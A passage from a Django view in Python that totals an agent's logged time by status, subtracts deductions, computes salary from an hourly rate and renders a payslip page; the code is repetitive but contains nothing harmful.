    initial_time = datetime.strptime(work_hours['paid_leaves'], '%H:%M:%S').time()

    # Specify the number of hours to add
    hours_to_add = leaves*8

    total_seconds = hours_to_add * 3600
    minutes, seconds = divmod(total_seconds, 60)
    hours_, minutes = divmod(minutes, 60)
    
    # Format the time as HH:MM:SS
    formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"



    # Format the new time as a string
    work_hours['paid_leaves'] = formatted_time      
    
    logged_in = WorkStatus.objects.filter(active=True,date=date,profile=agent).first()
    logged_out = WorkStatus.objects.filter(active=True,date=date,profile=agent,status="end_shift").last()
    work_hours['logged_in'] = logged_in
    work_hours['logged_out'] = logged_out 
    time_format = '%H:%M:%S'
    
    past_status = 0
    past_status_started = 0
    for hour in hours:
        if past_status_started == 0:
            past_status = str(hour.status)
            past_status_started = str(hour.time.strftime("%H:%M:%S"))
        elif past_status_started !=0 :
            current_status = hour.status
            current_status_started = (hour.time).strftime("%H:%M:%S")
            
            time1 = datetime.strptime(str(past_status_started), time_format)
            time2 = datetime.strptime(str(current_status_started), time_format)
            time_difference = time2 - time1
            
            if work_hours[past_status] == 0:
                work_hours[past_status] = str(time_difference)
                
            else:
                #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                #total_working_after = datetime.strptime(str(time_difference), time_format)
                #total_hours = total_working_before+total_working_after
                try:
                    parts = str(time_difference).split(', ')
                    days_str = parts[0]  # Extract days part
                    time_difference = parts[1]      
                except:
                    pass
                """
                hours_str, minutes_str, seconds_str = str(work_hours[past_status]).split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)
                work_hours[past_status] = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                
                work_hours['total_hours'] = formating_hours(work_hours['total_hours'])
                """

                time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                # Split the time string into hours, minutes, and seconds
                hours_str, minutes_str, seconds_str = time_str.split(':')

                # Convert hours, minutes, and seconds to integers
                hours = int(hours_str)
                minutes = int(minutes_str)
                seconds = int(seconds_str)

                # Create a timedelta object
                time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                # Add timedelta objects together
                total_hours = time_delta1 + time_delta2
                        

                work_hours[past_status] = str(total_hours)
                
                total_hours = (str(total_hours))
                components = total_hours.split(', ')

                if len(components) == 2:
                    # If the time string contains two components (days and time), parse them separately
                    days_part, time_part = components
                    days = int(days_part.split()[0])  # Extract the number of days
                else:
                    # If the time string contains only one component (time), assume 0 days
                    time_part = components[0]
                    days = 0
                
                # Extract hours, minutes, and seconds from the time part
                time_components = time_part.split(':')
                hours = int(time_components[0])
                minutes = int(time_components[1])
                seconds = int(time_components[2])
                
                # Convert days to hours and add to the hours component
                hours += days * 24
                
                # Format the time as HH:MM:SS
                total_hours = f'{hours:02}:{minutes:02}:{seconds:02}'

                ###############################3


                time_components = total_hours.split(':')

                # Extract hours, minutes, and seconds from the time part
                hours = int(time_components[0])
                minutes = int(time_components[1])
                seconds = int(time_components[2])

                # Calculate the total number of seconds
                total_seconds = hours * 3600 + minutes * 60 + seconds

                # Calculate hours, minutes, and seconds from total_seconds
                hours = total_seconds // 3600
                minutes = (total_seconds % 3600) // 60
                seconds = total_seconds % 60

                # Format the time as HH:MM:SS
                formatted_time = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                


                work_hours[past_status] = total_hours
        


            past_status = current_status
            past_status_started = current_status_started
    agent_hours = work_hours
    #ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
    ready = work_hours['ready']
    break_ = work_hours['break']
    meeting = work_hours['meeting']
    afk = work_hours['afk']
    technical_issue = work_hours['technical_issue']
    paid_leaves = work_hours['paid_leaves']
    deductions = work_hours['deductions']
    deducted_hours = work_hours['deducted_hours']
    added_hours = work_hours['added_hours']
    #break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
    #meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
    #afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
    #technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
    #paid_leaves =  datetime.strptime(str(work_hours['paid_leaves']), time_format) - datetime.strptime('00:00:00', time_format)
    #deductions =  datetime.strptime(str(work_hours['deductions']), time_format) - datetime.strptime('00:00:00', time_format)

    hours_str, minutes_str, seconds_str = str(ready).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    ready = timedelta(hours=hours, minutes=minutes, seconds=seconds)

    # Add timedelta objects together
    hours_str, minutes_str, seconds_str = str(break_).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    break_ = timedelta(hours=hours, minutes=minutes, seconds=seconds)


    # Add timedelta objects together
    hours_str, minutes_str, seconds_str = str(meeting).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    meeting = timedelta(hours=hours, minutes=minutes, seconds=seconds)


    # Add timedelta objects together
    hours_str, minutes_str, seconds_str = str(afk).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    afk = timedelta(hours=hours, minutes=minutes, seconds=seconds)


                    # Add timedelta objects together
    hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)

    # Create a timedelta object


                    # Add timedelta objects together
    hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)


    hours_str, minutes_str, seconds_str = str(paid_leaves).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    paid_leaves = timedelta(hours=hours, minutes=minutes, seconds=seconds)

    hours_str, minutes_str, seconds_str = str(deductions).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    deductions = timedelta(hours=hours, minutes=minutes, seconds=seconds)

    hours_str, minutes_str, seconds_str = str(deducted_hours).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    deducted_hours = timedelta(hours=hours, minutes=minutes, seconds=seconds)


    hours_str, minutes_str, seconds_str = str(added_hours).split(':')

    # Convert hours, minutes, and seconds to integers
    hours = int(hours_str)
    minutes = int(minutes_str)
    seconds = int(seconds_str)

    # Create a timedelta object
    added_hours = timedelta(hours=hours, minutes=minutes, seconds=seconds)






    work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
    work_hours['total_paid_hours'] = ready + meeting + paid_leaves + added_hours - deductions - deducted_hours
    
    work_hours['total_hours'] = formating_hours(work_hours['total_hours'])
    work_hours['total_paid_hours'] = formating_hours(work_hours['total_paid_hours'])

    # Add timedelta objects together
    hours, minutes, seconds = map(int, str(work_hours["total_paid_hours"]).split(':'))

    # Calculate total hours worked (including fractional hours for minutes and seconds)
    total_hours_worked = hours + (minutes / 60) + (seconds / 3600)
    
    # Define the hourly rate (e.g., $2 per hour)
    hourly_rate = agent.hourly_rate
    
    # Calculate the payment for the working time
    

    payment = total_hours_worked * hourly_rate

    



    work_hours['salary'] = payment


    




    context = { 'messages':messages,
                'notifications':notifications,
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'permissions':permissions,
                'work_status':work_status,
                'agent_hours':agent_hours,
                'month':datem,
                'year':datey,
                'agent':agent,
                'deductions':deductions,
                'added_hours':added_hours_list,
                'deducted_hours':deducted_hours_list,
                }
    
    return render(request, "agents/agent_payslip.html", context)
